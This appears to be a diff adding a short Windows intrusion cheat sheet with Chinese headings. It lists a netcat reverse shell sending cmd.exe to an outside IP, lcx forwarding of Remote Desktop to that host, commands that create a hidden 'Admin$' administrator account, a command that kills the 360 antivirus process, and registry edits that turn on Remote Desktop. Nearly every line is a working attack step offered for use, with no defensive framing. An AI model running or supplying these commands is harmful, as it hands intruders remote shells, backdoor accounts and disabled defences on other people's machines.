@@ -1,0 +1,27 @@
+nc -vv -lp 52
+nc.exe -e cmd.exe 139.199.16.124 52
+
+lcx.exe -listen 51 33891
+lcx.exe -slave 139.199.16.124 51 127.0.0.1 3389
+
+net user Admin$ Aa123456. /add
+net localgroup Administrators Admin$ /add
+
+runas /noprofile /user:Administrator cmd
+
+
+在Windows Server 2003下建立隐藏帐户 : http://leihenzhimu.blog.51cto.com/3217508/758825
+
+
+
+taskkill /f /t /im  360sd.exe
+
+
+开启3389
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+
+查看远程终端
+REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber
